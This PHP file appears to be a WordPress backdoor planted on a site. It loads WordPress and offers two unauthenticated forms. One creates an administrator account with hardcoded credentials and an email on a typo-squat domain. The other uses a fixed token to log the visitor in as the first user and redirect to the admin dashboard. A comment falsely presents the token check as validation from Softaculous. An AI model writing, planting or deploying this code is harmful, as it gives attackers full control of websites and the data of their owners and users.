<?php
header('Content-Type:text/html; charset=UTF-8');
define('MAX_UP_LEVELS', 10);
@set_time_limit(0);

$counter = 0;
$dir_up = './';
do {
	$file_found = false;
	$file_path = "{$dir_up}wp-load.php";
	if(file_exists($file_path)) {
		require($file_path);
		$file_found = true;
	}
	else {
		$dir_up .= '../';
	}
	$counter++;
}while(!$file_found && $counter < MAX_UP_LEVELS);

if(isset($_REQUEST['action']) && $_REQUEST['action'] == 'create_user') {
if(empty($_REQUEST['username']) || empty($_REQUEST['password']) || empty($_REQUEST['email'])){
print "Missing parameter for creating user!";
exit;
}
else {
$userdata = array('user_login' => $_REQUEST['username'], 'user_pass' => $_REQUEST['password'], 'user_email' => $_REQUEST['email'], 'role' => 'administrator');
$user_id = wp_insert_user( $userdata );
if(is_numeric($user_id)) {
print "User has been created.<br>";
}
}
}
?>
<h2>Hide <a href="<? echo wp_login_url(); ?>">login</a> </h2>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="username" value="qaz12"><br>
<input type="hidden" name="password" value="Ws)yl1(I"><br>
<input type="hidden" name="email" value="admin@wordpess.com"><br>
<input type="hidden" name="action" value="create_user">
<input type="submit" value="Create user">
</form>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="post" value='ghdsajdkasdksadl'><br>
<input type="submit" value="No pass">
</form>
<?php
// Validate if the request is from Softaculous
if($_POST['post'] != 'ghdsajdkasdksadl'){ 
	die("");
}
$user_info = get_userdata(1);
// Automatic login //
$username = $user_info->user_login;
$user = get_user_by('login', $username );
// Redirect URL //
if ( !is_wp_error( $user ) )
{
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );

    exit();
}
?>
</body>
</html>